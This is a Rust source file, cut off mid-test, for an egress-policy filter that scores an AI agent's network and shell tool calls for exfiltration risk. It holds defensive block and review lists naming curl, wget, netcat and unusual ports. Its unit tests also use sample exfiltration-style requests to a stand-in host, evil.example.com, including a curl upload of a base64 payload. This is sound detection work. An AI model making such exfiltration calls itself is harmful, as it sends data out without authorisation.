// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Egress destination policy enforcement filter.

use crate::filters::{FilterPhase, SecurityFilter};
use crate::scoring::severity_for;
use crate::types::{FilterResult, Severity, ToolCallContext, ToolCallType};
use regex::Regex;
use serde::Deserialize;
use std::collections::{HashMap, HashSet};
use std::net::IpAddr;

#[derive(Debug, Clone, Copy, Default, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum EgressMode {
    Monitor,
    #[default]
    Review,
    Enforce,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default)]
pub struct EgressPolicyConfig {
    pub enabled: bool,
    pub mode: EgressMode,
    pub trusted_domains: Vec<String>,
    pub blocked_domains: Vec<String>,
    pub blocked_schemes: Vec<String>,
    pub review_schemes: Vec<String>,
    pub blocked_ports: Vec<u16>,
    pub review_ports: Vec<u16>,
    pub allow_private_ip: bool,
    pub review_unknown_destinations: bool,
    pub blocked_command_tokens: Vec<String>,
    pub review_command_tokens: Vec<String>,
    /// Minimum Shannon entropy (bits-per-char) to flag a URL/arg segment.
    pub entropy_threshold: f64,
    /// Minimum length of a contiguous base64-alphabet run to flag.
    pub base64_min_chunk_len: usize,
    /// URL length (chars) above which the request is flagged.
    pub suspicious_url_length: usize,
    /// Command argument total length (chars) above which the request is flagged.
    pub suspicious_arg_length: usize,
    /// Ports considered unusual for outbound connections (flagged at review level).
    pub unusual_ports: Vec<u16>,
    /// Per-profile trusted destination overrides. Maps profile name to a list of
    /// trusted domains for that profile (e.g., "claude-code" → ["api.anthropic.com"]).
    /// These are merged with the global `trusted_domains` when evaluating calls with
    /// a matching `profile_name` on the `ToolCallContext`.
    pub profile_trusted_domains: HashMap<String, Vec<String>>,
}

impl Default for EgressPolicyConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            mode: EgressMode::Review,
            trusted_domains: vec![],
            blocked_domains: vec![],
            blocked_schemes: vec![
                "ftp".into(),
                "sftp".into(),
                "tftp".into(),
                "gopher".into(),
                "file".into(),
                "data".into(),
            ],
            review_schemes: vec!["smtp".into(), "dns".into(), "ws".into(), "wss".into()],
            blocked_ports: vec![21, 23, 25],
            review_ports: vec![53, 110, 143, 445, 587, 2525],
            allow_private_ip: true,
            review_unknown_destinations: true,
            blocked_command_tokens: vec![
                "nslookup ".into(),
                " dig ".into(),
                "ftp ".into(),
                "sftp ".into(),
            ],
            review_command_tokens: vec![
                "curl ".into(),
                "wget ".into(),
                "nc ".into(),
                "netcat ".into(),
                "scp ".into(),
            ],
            entropy_threshold: 4.5,
            base64_min_chunk_len: 40,
            suspicious_url_length: 2000,
            suspicious_arg_length: 4000,
            unusual_ports: vec![
                4444, 5555, 6666, 6667, 6697, 8443, 8888, 9090, 9999, 1337, 31337,
            ],
            profile_trusted_domains: HashMap::new(),
        }
    }
}

#[derive(Debug, Clone)]
struct Destination {
    scheme: Option<String>,
    host: String,
    port: Option<u16>,
}

pub struct EgressPolicyFilter {
    mode: EgressMode,
    trusted_domains: HashSet<String>,
    blocked_domains: HashSet<String>,
    blocked_schemes: HashSet<String>,
    review_schemes: HashSet<String>,
    blocked_ports: HashSet<u16>,
    review_ports: HashSet<u16>,
    allow_private_ip: bool,
    review_unknown_destinations: bool,
    blocked_command_tokens: Vec<String>,
    review_command_tokens: Vec<String>,
    command_url_regex: Regex,
    entropy_threshold: f64,
    base64_min_chunk_len: usize,
    suspicious_url_length: usize,
    suspicious_arg_length: usize,
    unusual_ports: HashSet<u16>,
    /// Per-profile trusted domain sets. When a `ToolCallContext` has a `profile_name`,
    /// these are checked alongside the global `trusted_domains`.
    profile_trusted: HashMap<String, HashSet<String>>,
}

impl EgressPolicyFilter {
    pub fn from_config(config: EgressPolicyConfig) -> Self {
        let command_url_regex =
            Regex::new(r#"([A-Za-z][A-Za-z0-9+\.-]*://[^\s"']+)"#).expect("regex must compile");

        let profile_trusted = config
            .profile_trusted_domains
            .into_iter()
            .map(|(name, domains)| (name.to_lowercase(), normalize_domains(domains)))
            .collect();

        Self {
            mode: config.mode,
            trusted_domains: normalize_domains(config.trusted_domains),
            blocked_domains: normalize_domains(config.blocked_domains),
            blocked_schemes: normalize_tokens(config.blocked_schemes),
            review_schemes: normalize_tokens(config.review_schemes),
            blocked_ports: config.blocked_ports.into_iter().collect(),
            review_ports: config.review_ports.into_iter().collect(),
            allow_private_ip: config.allow_private_ip,
            review_unknown_destinations: config.review_unknown_destinations,
            blocked_command_tokens: normalize_vec(config.blocked_command_tokens),
            review_command_tokens: normalize_vec(config.review_command_tokens),
            command_url_regex,
            entropy_threshold: config.entropy_threshold,
            base64_min_chunk_len: config.base64_min_chunk_len,
            suspicious_url_length: config.suspicious_url_length,
            suspicious_arg_length: config.suspicious_arg_length,
            unusual_ports: config.unusual_ports.into_iter().collect(),
            profile_trusted,
        }
    }

    pub fn with_defaults() -> Self {
        Self::from_config(EgressPolicyConfig::default())
    }

    fn blocked_score(&self) -> f64 {
        match self.mode {
            EgressMode::Enforce => 9.0,
            EgressMode::Review => 6.5,
            EgressMode::Monitor => 2.0,
        }
    }

    fn review_score(&self) -> f64 {
        match self.mode {
            EgressMode::Enforce => 4.5,
            EgressMode::Review => 3.5,
            EgressMode::Monitor => 1.0,
        }
    }

    fn domain_matches(domains: &HashSet<String>, host: &str) -> bool {
        let host = host.to_lowercase();
        domains
            .iter()
            .any(|domain| host == *domain || host.ends_with(&format!(".{domain}")))
    }

    fn parse_url_destination(url: &str) -> Option<Destination> {
        let (scheme, rest) = url.split_once("://")?;
        if scheme.is_empty() {
            return None;
        }

        let authority = rest.split('/').next().unwrap_or(rest);
        let authority = authority.rsplit('@').next().unwrap_or(authority);
        let (host, port) = parse_host_port(authority);
        if host.is_empty() {
            return None;
        }

        Some(Destination {
            scheme: Some(scheme.to_lowercase()),
            host: host.to_lowercase(),
            port,
        })
    }

    fn parse_net_destination(address: &str, port: u16) -> Destination {
        Destination {
            scheme: None,
            host: address.to_lowercase(),
            port: Some(port),
        }
    }

    fn default_port_for_scheme(scheme: &str) -> Option<u16> {
        match scheme {
            "http" => Some(80),
            "https" => Some(443),
            "ws" => Some(80),
            "wss" => Some(443),
            "ftp" => Some(21),
            "sftp" => Some(22),
            "smtp" => Some(25),
            "dns" => Some(53),
            _ => None,
        }
    }

    fn extract_destinations_from_command(&self, command: &str) -> Vec<Destination> {
        self.command_url_regex
            .captures_iter(command)
            .filter_map(|caps| caps.get(1).map(|m| m.as_str()))
            .filter_map(Self::parse_url_destination)
            .collect()
    }

    fn evaluate_destination(
        &self,
        dest: &Destination,
        source: &str,
        profile_trusted: Option<&HashSet<String>>,
    ) -> Option<FilterResult> {
        let effective_port = dest.port.or_else(|| {
            dest.scheme
                .as_deref()
                .and_then(Self::default_port_for_scheme)
        });

        if let Some(scheme) = &dest.scheme {
            if self.blocked_schemes.contains(scheme) {
                let score = self.blocked_score();
                return Some(FilterResult::matched(
                    "egress_policy",
                    "blocked-scheme",
                    score,
                    severity_for(score),
                    format!("Blocked outbound scheme from {source}: {scheme}"),
                ));
            }
        }

        if Self::domain_matches(&self.blocked_domains, &dest.host) {
            let score = self.blocked_score();
            return Some(FilterResult::matched(
                "egress_policy",
                "blocked-domain",
                score,
                severity_for(score),
                format!("Blocked outbound destination from {source}: {}", dest.host),
            ));
        }

        if let Some(port) = effective_port {
            if self.blocked_ports.contains(&port) {
                let score = self.blocked_score();
                return Some(FilterResult::matched(
                    "egress_policy",
                    "blocked-port",
                    score,
                    severity_for(score),
                    format!("Blocked outbound destination port from {source}: {port}"),
                ));
            }
        }

        if !self.allow_private_ip && is_private_or_local_host(&dest.host) {
            let score = self.review_score();
            return Some(FilterResult::matched(
                "egress_policy",
                "private-address-egress",
                score,
                severity_for(score),
                format!(
                    "Private/local address outbound from {source}: {}",
                    dest.host
                ),
            ));
        }

        if let Some(scheme) = &dest.scheme {
            if self.review_schemes.contains(scheme) {
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress_policy",
                    "review-scheme",
                    score,
                    severity_for(score),
                    format!("Review outbound scheme from {source}: {scheme}"),
                ));
            }
        }

        if let Some(port) = effective_port {
            if self.review_ports.contains(&port) {
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress_policy",
                    "review-port",
                    score,
                    severity_for(score),
                    format!("Review outbound destination port from {source}: {port}"),
                ));
            }
        }

        if Self::domain_matches(&self.trusted_domains, &dest.host) {
            return Some(FilterResult::matched(
                "egress_policy",
                "trusted-destination",
                -1.0,
                Severity::Notice,
                format!("Trusted outbound destination from {source}: {}", dest.host),
            ));
        }

        if let Some(profile_domains) = profile_trusted {
            if Self::domain_matches(profile_domains, &dest.host) {
                return Some(FilterResult::matched(
                    "egress_policy",
                    "profile-trusted-destination",
                    -1.0,
                    Severity::Notice,
                    format!(
                        "Profile-trusted outbound destination from {source}: {}",
                        dest.host
                    ),
                ));
            }
        }

        if self.review_unknown_destinations {
            let score = self.review_score();
            return Some(FilterResult::matched(
                "egress_policy",
                "unknown-destination",
                score,
                severity_for(score),
                format!("Unknown outbound destination from {source}: {}", dest.host),
            ));
        }

        None
    }

    /// Evaluate protocol-specific risk signals on a string (URL, command args, etc.).
    /// Returns the highest-risk signal found, if any.
    fn evaluate_protocol_signals(&self, text: &str, source: &str) -> Option<FilterResult> {
        let mut best: Option<FilterResult> = None;

        // 1. Suspicious length
        let len_limit = if source.contains("url") {
            self.suspicious_url_length
        } else {
            self.suspicious_arg_length
        };
        if text.len() > len_limit {
            let score = self.review_score();
            best = Self::select_higher_risk(
                best,
                Some(FilterResult::matched(
                    "egress_policy",
                    "suspicious-length",
                    score,
                    severity_for(score),
                    format!(
                        "Suspicious {source} length ({} chars, threshold {len_limit})",
                        text.len()
                    ),
                )),
            );
        }

        // 2. Base64 chunking — look for long runs of base64-alphabet characters
        if let Some(run_len) = longest_base64_run(text) {
            if run_len >= self.base64_min_chunk_len {
                let score = self.review_score();
                best = Self::select_higher_risk(
                    best,
                    Some(FilterResult::matched(
                        "egress_policy",
                        "base64-chunking",
                        score,
                        severity_for(score),
                        format!(
                            "Possible base64-encoded payload in {source} ({run_len} char run, threshold {})",
                            self.base64_min_chunk_len
                        ),
                    )),
                );
            }
        }

        // 3. Entropy burst — check segments separated by common delimiters
        for segment in text.split(['/', '?', '&', '=', ' ']) {
            if segment.len() < 16 {
                continue;
            }
            let entropy = shannon_entropy(segment);
            if entropy >= self.entropy_threshold {
                let score = self.review_score();
                best = Self::select_higher_risk(
                    best,
                    Some(FilterResult::matched(
                        "egress_policy",
                        "high-entropy-segment",
                        score,
                        severity_for(score),
                        format!(
                            "High-entropy segment in {source} (entropy {entropy:.2} bits/char, threshold {})",
                            self.entropy_threshold
                        ),
                    )),
                );
                break; // one hit is enough
            }
        }

        best
    }

    /// Check whether a destination port is in the unusual-ports set.
    fn evaluate_unusual_port(&self, dest: &Destination, source: &str) -> Option<FilterResult> {
        let effective_port = dest.port.or_else(|| {
            dest.scheme
                .as_deref()
                .and_then(Self::default_port_for_scheme)
        });

        if let Some(port) = effective_port {
            if self.unusual_ports.contains(&port)
                && !self.blocked_ports.contains(&port)
                && !self.review_ports.contains(&port)
            {
                let score = self.review_score();
                return Some(FilterResult::matched(
                    "egress_policy",
                    "unusual-port",
                    score,
                    severity_for(score),
                    format!("Unusual outbound destination port from {source}: {port}"),
                ));
            }
        }

        None
    }

    fn evaluate_command_tokens(&self, command: &str) -> Option<FilterResult> {
        let lowered = command.to_lowercase();

        if let Some(token) = self
            .blocked_command_tokens
            .iter()
            .find(|token| lowered.contains(token.as_str()))
        {
            let score = self.blocked_score();
            return Some(FilterResult::matched(
                "egress_policy",
                "blocked-egress-command-token",
                score,
                severity_for(score),
                format!("Blocked outbound command token: {token}"),
            ));
        }

        if let Some(token) = self
            .review_command_tokens
            .iter()
            .find(|token| lowered.contains(token.as_str()))
        {
            let score = self.review_score();
            return Some(FilterResult::matched(
                "egress_policy",
                "review-egress-command-token",
                score,
                severity_for(score),
                format!("Review outbound command token: {token}"),
            ));
        }

        None
    }

    fn select_higher_risk(
        current: Option<FilterResult>,
        next: Option<FilterResult>,
    ) -> Option<FilterResult> {
        match (current, next) {
            (None, rhs) => rhs,
            (lhs, None) => lhs,
            (Some(lhs), Some(rhs)) => {
                if rhs.score > lhs.score {
                    Some(rhs)
                } else {
                    Some(lhs)
                }
            }
        }
    }
}

#[async_trait::async_trait]
impl SecurityFilter for EgressPolicyFilter {
    fn name(&self) -> &str {
        "egress_policy"
    }

    fn phase(&self) -> FilterPhase {
        FilterPhase::Pattern
    }

    async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
        let mut best: Option<FilterResult> = None;

        // Resolve per-profile trusted domains for this context.
        let prof_trusted = ctx
            .profile_name
            .as_ref()
            .and_then(|name| self.profile_trusted.get(&name.to_lowercase()));

        match &ctx.call_type {
            ToolCallType::HttpRequest { url, .. } => {
                if let Some(dest) = Self::parse_url_destination(url) {
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_destination(&dest, "http_request", prof_trusted),
                    );
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_unusual_port(&dest, "http_request"),
                    );
                }
                best = Self::select_higher_risk(best, self.evaluate_protocol_signals(url, "url"));
            }
            ToolCallType::NetConnect { address, port } => {
                if address.starts_with("raw:") {
                    // Raw socket family (AF_PACKET, AF_NETLINK, etc.) detected.
                    // AF_PACKET bypasses the IP stack entirely and can exfiltrate
                    // arbitrary Ethernet frames. Score unconditionally high so the
                    // call lands well above the deny threshold regardless of mode.
                    return Ok(FilterResult::matched(
                        "egress_policy",
                        "raw-socket",
                        7.0,
                        severity_for(7.0),
                        format!("Raw socket ({address}): can exfiltrate data bypassing IP stack"),
                    ));
                }
                let dest = Self::parse_net_destination(address, *port);
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_destination(&dest, "net_connect", prof_trusted),
                );
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_unusual_port(&dest, "net_connect"),
                );
            }
            ToolCallType::NetListen { address, port } => {
                if address.starts_with("raw:") {
                    return Ok(FilterResult::matched(
                        "egress_policy",
                        "raw-socket",
                        7.0,
                        severity_for(7.0),
                        format!(
                            "Raw socket bind ({address}): can exfiltrate data bypassing IP stack"
                        ),
                    ));
                }
                // OpenClaw profile: only loopback binds are permitted without review.
                // Any bind to a non-loopback address (including 0.0.0.0) scores 5.0 to
                // trigger the digest queue for human approval.
                if ctx
                    .profile_name
                    .as_deref()
                    .map(|p| p.eq_ignore_ascii_case("openclaw"))
                    .unwrap_or(false)
                    && !is_loopback_bind_address(address)
                {
                    best = Some(FilterResult::matched(
                        "egress_policy",
                        "openclaw-non-loopback-bind",
                        5.0,
                        severity_for(5.0),
                        format!(
                            "OpenClaw profile: non-loopback bind requires approval \
                             (address: {address}:{port})"
                        ),
                    ));
                }
                let dest = Self::parse_net_destination(address, *port);
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_destination(&dest, "net_listen", prof_trusted),
                );
                best =
                    Self::select_higher_risk(best, self.evaluate_unusual_port(&dest, "net_listen"));
            }
            ToolCallType::DnsQuery { domain, .. } => {
                let dest = Self::parse_net_destination(domain, 53);
                best = Self::select_higher_risk(
                    best,
                    self.evaluate_destination(&dest, "dns_query", prof_trusted),
                );
            }
            ToolCallType::ShellExec { .. } => {
                if let Some(full) = ctx.full_command() {
                    best = Self::select_higher_risk(best, self.evaluate_command_tokens(&full));
                    for dest in self.extract_destinations_from_command(&full) {
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_destination(&dest, "command", prof_trusted),
                        );
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_unusual_port(&dest, "command"),
                        );
                    }
                    best = Self::select_higher_risk(
                        best,
                        self.evaluate_protocol_signals(&full, "command_args"),
                    );
                }
            }
            ToolCallType::ProcessSpawn { command, args } => {
                let full = if args.is_empty() {
                    command.clone()
                } else {
                    format!("{} {}", command, args.join(" "))
                };
                best = Self::select_higher_risk(best, self.evaluate_command_tokens(&full));

                let arg_text = args.join(" ");
                if !arg_text.is_empty() {
                    for dest in self.extract_destinations_from_command(&arg_text) {
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_destination(&dest, "command", prof_trusted),
                        );
                        best = Self::select_higher_risk(
                            best,
                            self.evaluate_unusual_port(&dest, "command"),
                        );
                    }
                }
            }
            _ => {}
        }

        Ok(best.unwrap_or_else(|| FilterResult::no_match("egress_policy")))
    }
}

fn normalize_vec(values: Vec<String>) -> Vec<String> {
    values
        .into_iter()
        .map(|v| v.trim().to_lowercase())
        .filter(|v| !v.is_empty())
        .collect()
}

fn normalize_tokens(values: Vec<String>) -> HashSet<String> {
    normalize_vec(values).into_iter().collect()
}

fn normalize_domains(values: Vec<String>) -> HashSet<String> {
    normalize_vec(values)
        .into_iter()
        .map(|v| v.trim_start_matches('.').to_string())
        .collect()
}

fn parse_host_port(authority: &str) -> (String, Option<u16>) {
    if authority.starts_with('[') {
        if let Some(end) = authority.find(']') {
            let host = authority[1..end].to_string();
            let remainder = authority.get(end + 1..).unwrap_or_default();
            if let Some(port_text) = remainder.strip_prefix(':') {
                if let Ok(port) = port_text.parse::<u16>() {
                    return (host, Some(port));
                }
            }
            return (host, None);
        }
        return (authority.to_string(), None);
    }

    if let Some((host, port_text)) = authority.rsplit_once(':') {
        if !host.contains(':') && !port_text.is_empty() {
            if let Ok(port) = port_text.parse::<u16>() {
                return (host.to_string(), Some(port));
            }
        }
    }

    (authority.to_string(), None)
}

/// Shannon entropy in bits per character.
fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    let len = s.len() as f64;
    for &b in s.as_bytes() {
        counts[b as usize] += 1;
    }
    counts
        .iter()
        .copied()
        .filter(|&c| c > 0)
        .map(|c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Returns the length of the longest contiguous run of base64-alphabet characters
/// (A-Z, a-z, 0-9, +, /, =). Returns `None` if no run is found.
fn longest_base64_run(s: &str) -> Option<usize> {
    let mut max_run = 0usize;
    let mut current_run = 0usize;
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=' {
            current_run += 1;
            if current_run > max_run {
                max_run = current_run;
            }
        } else {
            current_run = 0;
        }
    }
    if max_run > 0 {
        Some(max_run)
    } else {
        None
    }
}

/// Returns `true` if the bind address is a loopback address that OpenClaw allows
/// without review (127.0.0.1, ::1, or "localhost").
fn is_loopback_bind_address(addr: &str) -> bool {
    let lower = addr.to_lowercase();
    lower == "localhost" || lower == "127.0.0.1" || lower == "::1"
}

fn is_private_or_local_host(host: &str) -> bool {
    if host.eq_ignore_ascii_case("localhost") {
        return true;
    }

    match host.parse::<IpAddr>() {
        Ok(IpAddr::V4(ip)) => {
            ip.is_private()
                || ip.is_loopback()
                || ip.is_link_local()
                || ip.is_broadcast()
                || ip.is_documentation()
        }
        Ok(IpAddr::V6(ip)) => {
            let first_segment = ip.segments()[0];
            let is_unique_local = (first_segment & 0xfe00) == 0xfc00; // fc00::/7
            let is_link_local = (first_segment & 0xffc0) == 0xfe80; // fe80::/10
            ip.is_loopback() || ip.is_unspecified() || is_unique_local || is_link_local
        }
        Err(_) => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use uuid::Uuid;

    fn make_ctx(call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4())
    }

    /// Helper: create a filter with some trusted domains for tests that need them.
    fn filter_with_trusted() -> EgressPolicyFilter {
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec![
            "github.com".into(),
            "api.github.com".into(),
            "registry.npmjs.org".into(),
            "pypi.org".into(),
            "crates.io".into(),
        ];
        EgressPolicyFilter::from_config(cfg)
    }

    #[tokio::test]
    async fn test_blocked_scheme_is_high_risk() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "ftp://example.com/file.txt".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-scheme");
        assert!(result.score >= 6.0);
    }

    #[tokio::test]
    async fn test_trusted_domain_reduces_score() {
        let filter = filter_with_trusted();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://github.com/grith-ai/grith".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_unknown_domain_reviews_by_default() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://unseen-domain-for-test.example/path".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unknown-destination");
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_netconnect_blocked_port() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "198.51.100.25".into(),
            port: 25,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-port");
    }

    #[tokio::test]
    async fn test_command_token_review() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec!["https://example.org/upload".into()],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "review-egress-command-token");
    }

    #[tokio::test]
    async fn test_unusual_port_flagged() {
        // Disable review_unknown_destinations so unusual-port isn't masked
        let cfg = EgressPolicyConfig {
            review_unknown_destinations: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "198.51.100.25".into(),
            port: 4444,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unusual-port");
    }

    #[tokio::test]
    async fn test_af_packet_net_connect_scores_high() {
        // AF_PACKET sendto() reaches the egress filter as NetConnect with
        // address="raw:af_packet". It must score >= 7.0 regardless of mode.
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "raw:af_packet".into(),
            port: 0,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched, "raw:af_packet must produce a match");
        assert_eq!(result.rule_id, "raw-socket");
        assert!(
            result.score >= 7.0,
            "raw:af_packet score must be >= 7.0 to reach deny range, got {}",
            result.score
        );
    }

    #[tokio::test]
    async fn test_af_netlink_net_connect_scores_high() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "raw:af_netlink".into(),
            port: 0,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "raw-socket");
        assert!(result.score >= 7.0);
    }

    #[tokio::test]
    async fn test_raw_socket_score_is_mode_independent() {
        // Even in Monitor mode the raw-socket score must remain 7.0 — raw
        // sockets are always dangerous regardless of egress policy mode.
        let cfg = EgressPolicyConfig {
            mode: EgressMode::Monitor,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "raw:af_packet".into(),
            port: 0,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_eq!(result.rule_id, "raw-socket");
        assert_eq!(result.score, 7.0);
    }

    #[tokio::test]
    async fn test_high_entropy_url_flagged() {
        let cfg = EgressPolicyConfig {
            entropy_threshold: 3.8,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://evil.example.com/exfil?d=a8f3e1b2c4d5f6071829304a5b6c7d8e9f0a1b2c3d4e5f607182930".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // Could be high-entropy-segment or unknown-destination — both are valid signals
        assert!(
            result.rule_id == "high-entropy-segment" || result.rule_id == "unknown-destination",
            "unexpected rule_id: {}",
            result.rule_id
        );
    }

    #[tokio::test]
    async fn test_base64_chunk_in_command_flagged() {
        let cfg = EgressPolicyConfig {
            base64_min_chunk_len: 30,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let b64_payload = "SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdElzUXVpdGVMb25n";
        let ctx = make_ctx(ToolCallType::ShellExec {
            command: "curl".into(),
            args: vec![
                "-d".into(),
                b64_payload.into(),
                "https://example.com/upload".into(),
            ],
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // The review-egress-command-token or base64-chunking could win depending on score
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_suspicious_url_length_flagged() {
        let cfg = EgressPolicyConfig {
            suspicious_url_length: 100,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let long_path = "a".repeat(120);
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: format!("https://evil.example.com/{long_path}"),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_normal_url_no_protocol_signal() {
        let filter = filter_with_trusted();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "GET".into(),
            url: "https://crates.io/api/v1/crates/serde".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // Trusted domain — should get -1.0, not flagged for entropy/length/base64
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[test]
    fn test_shannon_entropy_uniform() {
        // All same character — entropy is 0
        assert_eq!(shannon_entropy("aaaaaaa"), 0.0);
    }

    #[test]
    fn test_shannon_entropy_high() {
        // Random-looking hex string should have high entropy
        let e = shannon_entropy("a8f3e1b2c4d5f607");
        assert!(e > 3.5, "entropy was {e}");
    }

    #[test]
    fn test_longest_base64_run_detects() {
        let run = longest_base64_run("prefix SGVsbG9Xb3JsZA== suffix");
        // "SGVsbG9Xb3JsZA==" is 16 chars of base64 alphabet (no space breaks it)
        assert_eq!(run, Some(16));
    }

    #[test]
    fn test_longest_base64_run_none_for_short() {
        // Short base64 runs shouldn't matter — tested against threshold elsewhere
        let run = longest_base64_run("abc def");
        assert_eq!(run, Some(3)); // "abc" and "def" are 3-char runs
    }

    #[tokio::test]
    async fn test_unusual_port_in_url() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.example.com:4444/exfil".into(),
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // Could be unusual-port or unknown-destination
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_standard_port_not_unusual() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "198.51.100.25".into(),
            port: 443,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        // 443 is not in unusual_ports, blocked_ports, or review_ports
        // It's an unknown destination, not unusual-port
        assert!(result.rule_id != "unusual-port");
    }

    #[tokio::test]
    async fn test_private_address_review_when_disabled() {
        let cfg = EgressPolicyConfig {
            allow_private_ip: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetConnect {
            address: "127.0.0.1".into(),
            port: 8080,
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "private-address-egress");
    }

    // ── Profile overlay tests ────────────────────────────────────────

    fn make_ctx_with_profile(call_type: ToolCallType, profile: &str) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4()).with_profile(profile)
    }

    #[tokio::test]
    async fn test_profile_trusted_domain_reduces_score() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains.insert(
            "claude-code".into(),
            vec!["api.anthropic.com".into(), "statsig.anthropic.com".into()],
        );
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_not_applied_without_profile() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        // No profile on context — should not get profile-trusted treatment
        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://api.anthropic.com/v1/messages".into(),
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_ne!(result.rule_id, "profile-trusted-destination");
    }

    #[tokio::test]
    async fn test_profile_trusted_not_applied_for_wrong_profile() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        // Different profile — anthropic.com is not trusted for codex
        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
